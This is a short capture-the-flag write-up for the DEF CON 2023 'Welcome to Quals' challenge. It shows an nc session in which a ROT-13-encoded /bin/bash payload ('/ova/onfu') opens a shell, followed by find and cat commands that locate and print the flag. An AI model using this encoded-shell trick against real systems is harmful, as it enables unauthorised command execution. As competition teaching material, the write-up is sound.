# Welcome to Quals

## Prompt
intro

Host: welcome-to-quals-vfnva65rlchqk.shellweplayaga.me

Port: 10001

## Analysis
Connecting to the challenge is the first step, and you're greeted with the prompt
```
kali@example:~/Documents/ctf/defcon2023/welcome-to-quals$ nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{some_ticket_value}
Hello challenger, enter your payload below:
```

When you type anything in, the prompt returns a ROT-13 version of your command.  The next step is real easy, but you have to move fast.  If you're too slow, you have to wait for the challenge to re-open.  From what I remember, it was a 10-second wait.

## Solution
The ROT-13 version of `/bin/bash` is `/ova/onfu`, so typing it in and navigating quickly:
```
kali@example:~/Documents/ctf/defcon2023/welcome-to-quals$ nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{some_ticket_value}
Hello challenger, enter your payload below:
/ova/onfu
find / type -f -name "*flag*"
```
returns

```
...
/welcome_flag.txt
...
Timeout!
```

Running the code again after I ran out of time,
```
kali@example:~/Documents/ctf/defcon2023/welcome-to-quals$ nc welcome-to-quals-vfnva65rlchqk.shellweplayaga.me 10001
Ticket please: ticket{some_ticket_value}
Hello challenger, enter your payload below:
/ova/onfu
cat /welcome_flag.txt
flag{OwnershipRemodel1982n23:TEMhDTMum5XNA-YIPDhex8KWYOXvi816ty_rShXZpBRhxy0pGN3tHxSqjXGuYSLntxvgTUjaEreyNN_A4yo-gQ}Timeout!
```

Moving fast on easy problems allows you to move onto more difficult problems and devote your time and focus to the bulk of the points.
